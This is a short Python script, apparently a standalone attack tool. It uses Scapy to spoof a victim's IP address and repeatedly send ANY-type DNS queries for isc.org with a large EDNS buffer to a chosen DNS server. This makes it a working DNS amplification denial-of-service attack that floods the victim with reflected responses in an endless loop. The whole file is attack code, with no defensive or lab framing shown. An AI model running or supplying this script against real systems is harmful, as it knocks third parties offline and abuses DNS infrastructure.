#!/usr/bin/python3

from scapy.all import *
import argparse

def main(argv):
    victim_ip = ""
    dns_server_ip = ""

    parser = argparse.ArgumentParser()
    parser.add_argument("-v", help="This is the victim's IP Address")
    parser.add_argument("-s", help="This is the server's IP Address")

    args = parser.parse_args()

    victim_ip = args.v
    dns_server_ip = args.s

    print(victim_ip)
    print(dns_server_ip)


    ip = IP(src=victim_ip, dst=dns_server_ip)
    udp = UDP(dport=53, sport=RandShort())
    dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname="isc.org.", qtype=255, qclass="IN"), ar=DNSRROPT(rclass=4096))

    request = (ip/udp/dns)

    num_packets_sent = 0

    
    # Send packet
    while(1):
        num_packets_sent = num_packets_sent + 1
        send(request)
        print("Packet sent! Number of packets sent: {}".format(num_packets_sent))

if __name__ == "__main__":
    main(sys.argv[1:])
